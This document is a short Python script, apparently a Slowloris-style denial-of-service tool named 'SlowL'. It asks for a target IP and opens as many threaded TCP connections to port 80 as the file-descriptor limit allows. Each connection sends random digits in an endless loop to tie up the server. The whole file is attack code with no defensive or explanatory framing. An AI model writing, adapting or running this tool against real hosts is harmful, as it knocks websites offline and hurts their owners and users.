import socket
import random
import threading
import sys
import subprocess

class SlowL:
	def __init__(self, ip, port, maxt):
		self.ip = socket.gethostbyname(ip)
		self.port = port
		self.open = 0
		while True:
			if self.open < maxt:
				t = threading.Thread(target=self.handler)
				t.daemon = True
				t.start()
				self.open += 1
			print("Open count: " + str(self.open) + " - " + "Active thread count: " + str(threading.active_count()))

	def handler(self):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((self.ip, self.port))
		except:
			self.open -= 1
			sock.close()
			return
		while True:
			try:
				sock.sendall(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
				sock.recv(1024)
			except:
				sock.close()
				self.open -= 1
				break

if __name__ == '__main__':
	if sys.version_info[0] < 3:
		print("Python version 2.x")
		print("Set ulimit -n to 2000")
		ips = raw_input("IP NOW: ")
		mat = int(subprocess.check_output(["ulimit", "-n"]))
		s = SlowL(ips, 80, mat)
	else:
		print("Python version 3.x")
		print("Set ulimit -n to 2000")
		ips = input("IP NOW: ")
		mat = int(subprocess.check_output(["ulimit", "-n"]))
		s = SlowL(ips, 80, mat)
